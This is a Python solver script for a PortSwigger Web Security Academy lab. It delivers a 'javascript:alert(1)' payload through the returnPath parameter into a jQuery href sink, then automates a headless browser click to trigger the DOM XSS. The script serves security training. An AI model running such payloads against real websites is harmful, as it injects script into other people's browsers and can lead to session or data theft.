#!/usr/bin/env python3
"""
DOM XSS in jQuery anchor href attribute sink using location.search source
PortSwigger Web Security Academy — Cross-Site Scripting (XSS)

Companion script for the writeup: 05-dom-xss-jquery-href-attribute-sink.md

What this does:
    jQuery's .attr('href', returnPath) sets a "back" link's destination
    straight from location.search with no filtering. There's no HTML to
    break out of -- the entire attribute just needs to be a javascript:
    URI. Sets the returnPath parameter, then drives a headless browser to
    the feedback page and clicks the "back" link (the payload only fires on
    click, not on page load) while listening for the alert() dialog.

Usage:
    python 05-dom-xss-jquery-href-attribute-sink.py <lab-url>
    e.g. python 05-dom-xss-jquery-href-attribute-sink.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
    pip install playwright && playwright install chromium
"""

import sys
import urllib.parse
import httpx
from playwright.sync_api import sync_playwright

# .attr('href', ...) doesn't parse HTML -- a javascript: URI is enough.
PAYLOAD = "javascript:alert(1)"


def solve(lab_url: str) -> None:
    client = httpx.Client(base_url=lab_url, follow_redirects=True, timeout=20)
    client.get("/")
    session = client.cookies.get("session", "")
    domain = urllib.parse.urlparse(lab_url).netloc

    url = f"{lab_url}/feedback?returnPath={urllib.parse.quote(PAYLOAD)}"
    print(f"[*] Payload: {PAYLOAD}")
    print(f"[*] Delivering to: {url}")

    alert_fired = False
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        ctx = browser.new_context()
        if session:
            ctx.add_cookies([{"name": "session", "value": session, "domain": domain, "path": "/"}])
        page = ctx.new_page()

        def on_dialog(dialog):
            nonlocal alert_fired
            alert_fired = True
            dialog.accept()

        page.on("dialog", on_dialog)
        try:
            page.goto(url, wait_until="domcontentloaded", timeout=15000)
            page.wait_for_timeout(1000)
            # The javascript: URI only executes when the link is followed --
            # loading the page alone isn't enough.
            try:
                page.click("#backLink", timeout=3000)
            except Exception:
                page.click("a:has-text('Back')", timeout=3000)
            page.wait_for_timeout(3000)
        except Exception:
            pass
        browser.close()

    print(f"[{'+' if alert_fired else '-'}] alert() {'fired' if alert_fired else 'did NOT fire'} after clicking Back")

    check = client.get("/")
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
